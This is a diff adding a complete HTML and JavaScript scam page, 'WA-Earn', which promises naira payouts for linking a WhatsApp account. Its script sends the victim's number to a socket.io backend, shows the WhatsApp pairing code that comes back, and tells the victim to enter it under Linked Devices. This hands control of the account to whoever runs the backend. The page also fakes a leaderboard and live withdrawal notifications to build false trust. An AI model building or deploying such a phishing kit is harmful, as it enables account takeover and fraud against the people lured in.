@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WA-Earn | Passive Income</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0f172a;
+            --card: #1e293b;
+            --primary: #10b981;
+            --primary-hover: #059669;
+            --text: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: #334155;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
+        
+        /* Navbar */
+        .navbar { background: var(--card); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+        .logo { font-weight: 800; font-size: 20px; color: var(--primary); display: flex; align-items: center; gap: 8px; }
+        .logo svg { width: 24px; height: 24px; }
+        .nav-links { display: flex; gap: 15px; font-size: 14px; color: var(--text-muted); font-weight: 500; }
+        
+        /* Main Container */
+        .container { max-width: 500px; margin: 20px auto; padding: 0 20px; width: 100%; flex: 1; }
+        
+        /* Hero Card */
+        .hero-card { background: var(--card); border-radius: 20px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid var(--border); text-align: center; position: relative; overflow: hidden; }
+        .hero-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(16,185,129,0.1) 0%, transparent 60%); z-index: 0; }
+        .hero-content { position: relative; z-index: 1; }
+        .badge { background: rgba(16,185,129,0.2); color: var(--primary); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; display: inline-block; margin-bottom: 15px; }
+        .balance { font-size: 48px; font-weight: 800; color: var(--text); margin: 10px 0; letter-spacing: -1px; }
+        .balance span { color: var(--primary); font-size: 32px; }
+        .sub-text { color: var(--text-muted); font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        
+        /* Inputs and Buttons */
+        .btn { background: var(--primary); color: #fff; border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; transition: all 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .btn:hover { background: var(--primary-hover); transform: translateY(-2px); }
+        .btn:disabled { background: var(--border); color: var(--text-muted); cursor: not-allowed; transform: none; }
+        .input-group { display: none; margin-top: 20px; text-align: left; }
+        .input-group label { font-size: 12px; color: var(--text-muted); margin-bottom: 8px; display: block; font-weight: 500; }
+        .input-group input { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid var(--border); background: var(--bg); color: var(--text); font-size: 16px; outline: none; transition: border-color 0.2s; }
+        .input-group input:focus { border-color: var(--primary); }
+        .input-group input::placeholder { color: #475569; }
+        
+        /* Stats Grid */
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        .stat-card { background: var(--card); border-radius: 16px; padding: 20px; border: 1px solid var(--border); text-align: center; }
+        .stat-value { font-size: 24px; font-weight: 700; color: var(--text); }
+        .stat-label { font-size: 12px; color: var(--text-muted); margin-top: 5px; font-weight: 500; }
+        
+        /* Top Earners List */
+        .leaderboard { margin-top: 20px; background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid var(--border); }
+        .leaderboard h3 { font-size: 16px; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
+        .leader-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--border); }
+        .leader-item:last-child { border-bottom: none; }
+        .leader-info { display: flex; align-items: center; gap: 12px; }
+        .avatar { width: 32px; height: 32px; border-radius: 50%; background: var(--border); display: flex; justify-content: center; align-items: center; font-size: 12px; font-weight: bold; color: var(--text-muted); }
+        .leader-name { font-size: 14px; font-weight: 500; }
+        .leader-amount { font-size: 14px; font-weight: 700; color: var(--primary); }
+
+        /* Verification Code Display */
+        .code-display { font-size: 36px; font-weight: 800; letter-spacing: 6px; color: var(--primary); margin: 20px 0; background: rgba(16,185,129,0.1); padding: 15px; border-radius: 12px; border: 1px dashed var(--primary); }
+        
+        /* Toast Notifications */
+        .toast-container { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); z-index: 9999; display: flex; flex-direction: column; gap: 10px; width: 90%; max-width: 400px; }
+        .toast { background: var(--card); border-left: 4px solid var(--primary); color: var(--text); padding: 15px 20px; border-radius: 8px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); font-size: 14px; display: flex; align-items: center; gap: 12px; animation: slideUp 0.3s ease-out forwards; opacity: 0; transform: translateY(20px); }
+        .toast.hide { animation: fadeOut 0.3s ease-in forwards; }
+        @keyframes slideUp { to { opacity: 1; transform: translateY(0); } }
+        @keyframes fadeOut { to { opacity: 0; transform: translateY(-20px); } }
+
+        .success-screen { display: none; text-align: center; }
+        .success-icon { width: 80px; height: 80px; background: rgba(16,185,129,0.2); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
+        .success-icon svg { width: 40px; height: 40px; color: var(--primary); }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
+            WA-Earn
+        </div>
+        <div class="nav-links">
+            <span>Dashboard</span>
+            <span>Wallet</span>
+        </div>
+    </nav>
+
+    <div class="container">
+        <!-- STEP 1: LANDING & INPUT -->
+        <div id="step-1">
+            <div class="hero-card">
+                <div class="hero-content">
+                    <div class="badge">PASSIVE INCOME ACTIVE</div>
+                    <h1 style="font-size: 20px; margin-bottom: 10px;">Welcome to WA-Earn</h1>
+                    <div class="balance"><span>₦</span>2,000<span>.00</span></div>
+                    <p class="sub-text">Claim your signup bonus by linking your WhatsApp to our secure ad-campaign network. Keep it linked to earn ₦500 daily.</p>
+                    
+                    <button class="btn" id="start-btn" onclick="showInput()">Claim ₦2,000 Now</button>
+
+                    <div class="input-group" id="input-group">
+                        <label>WhatsApp Number (International Format)</label>
+                        <input type="tel" id="phone" placeholder="e.g. 2348012345678">
+                        <button class="btn" id="send-btn" onclick="requestCode()" style="margin-top: 15px;">Link Account & Earn</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value">₦500</div>
+                    <div class="stat-label">Daily Payout</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">₦500</div>
+                    <div class="stat-label">Referral Bonus</div>
+                </div>
+            </div>
+
+            <div class="leaderboard">
+                <h3>🏆 Top Earners This Week</h3>
+                <div id="leaderboard-list">
+                    <!-- Fake data injected by JS -->
+                </div>
+            </div>
+        </div>
+
+        <!-- STEP 2: WAITING FOR CODE -->
+        <div class="hero-card" id="step-2" style="display: none;">
+            <h2 style="font-size: 20px; margin-bottom: 10px;">Verify Device</h2>
+            <p class="sub-text">Open <strong>WhatsApp > Linked Devices</strong> and tap <strong>Link with Phone Number</strong>.</p>
+            
+            <div class="code-display" id="code-display">------</div>
+            
+            <p class="sub-text" style="color: #f59e0b; font-size: 13px;">Waiting for you to enter the code on your phone...</p>
+        </div>
+
+        <!-- STEP 3: SUCCESS -->
+        <div class="hero-card success-screen" id="step-3">
+            <div class="success-icon">
+                <svg fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path></svg>
+            </div>
+            <h2 style="font-size: 24px; margin-bottom: 10px;">Account Linked!</h2>
+            <p class="sub-text">Your ₦2,000 signup bonus has been credited to your wallet. The ad-campaign bot is now running in the background.</p>
+            
+            <div class="balance" style="font-size: 32px; margin-top: 20px;"><span>₦</span>2,000<span>.00</span></div>
+            
+            <button class="btn" style="margin-top: 20px; background: var(--border);">Withdraw (Min ₦10,000)</button>
+            <p class="sub-text" style="margin-top: 15px; font-size: 12px;">Keep the device linked to earn ₦500 daily.</p>
+        </div>
+    </div>
+
+    <!-- Fake Toast Container -->
+    <div class="toast-container" id="toast-container"></div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+
+        // 1. Inject Fake Leaderboard
+        const topEarners = [
+            { name: "Chinedu O.", amount: "₦145,000" },
+            { name: "Aisha M.", amount: "₦120,500" },
+            { name: "Tunde B.", amount: "₦98,000" },
+            { name: "Blessing E.", amount: "₦85,500" },
+            { name: "Ibrahim K.", amount: "₦72,000" }
+        ];
+        
+        const listEl = document.getElementById('leaderboard-list');
+        topEarners.forEach((user, index) => {
+            listEl.innerHTML += `
+                <div class="leader-item">
+                    <div class="leader-info">
+                        <div class="avatar">${user.name.charAt(0)}</div>
+                        <div class="leader-name">${user.name}</div>
+                    </div>
+                    <div class="leader-amount">${user.amount}</div>
+                </div>
+            `;
+        });
+
+        // 2. Fake Live Withdrawal Toasts
+        const fakeNames = ["Ada", "Chinedu", "Fatima", "Tunde", "Nneka", "Ibrahim", "Blessing", "Emeka", "Zainab", "Oluwaseun", "Musa", "Grace"];
+        
+        function showToast() {
+            const name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+            // Random amount between 10,000 and 100,000
+            const amount = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
+            const formattedAmount = "₦" + amount.toLocaleString();
+
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `
+                <svg style="width:20px;height:20px;color:var(--primary);" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+                <div><strong>${name}</strong> just withdrew <strong>${formattedAmount}</strong></div>
+            `;
+            document.getElementById('toast-container').appendChild(toast);
+            
+            setTimeout(() => { toast.classList.add('hide'); }, 4000);
+            setTimeout(() => { toast.remove(); }, 4300);
+        }
+        
+        // Randomize toast timing (between 8s and 15s)
+        function startToasts() {
+            showToast();
+            setTimeout(startToasts, Math.floor(Math.random() * 7000) + 8000);
+        }
+        setTimeout(startToasts, 3000);
+
+        // 3. User Interaction Logic
+        function showInput() {
+            document.getElementById('start-btn').style.display = 'none';
+            document.getElementById('input-group').style.display = 'block';
+        }
+
+        function requestCode() {
+            const phone = document.getElementById('phone').value;
+            if (!phone || phone.length < 10) return alert("Please enter a valid WhatsApp number.");
+            
+            document.getElementById('send-btn').disabled = true;
+            document.getElementById('send-btn').innerText = 'Connecting...';
+            
+            socket.emit('request_code', phone);
+        }
+
+        socket.on('code_generated', (code) => {
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'block';
+            document.getElementById('code-display').innerText = code;
+        });
+
+        socket.on('success', () => {
+            document.getElementById('step-2').style.display = 'none';
+            document.getElementById('step-3').style.display = 'block';
+        });
+
+        socket.on('error', (msg) => {
+            alert(msg);
+            document.getElementById('send-btn').disabled = false;
+            document.getElementById('send-btn').innerText = 'Link Account & Earn';
+        });
+    </script>
+</body>
+  </html>
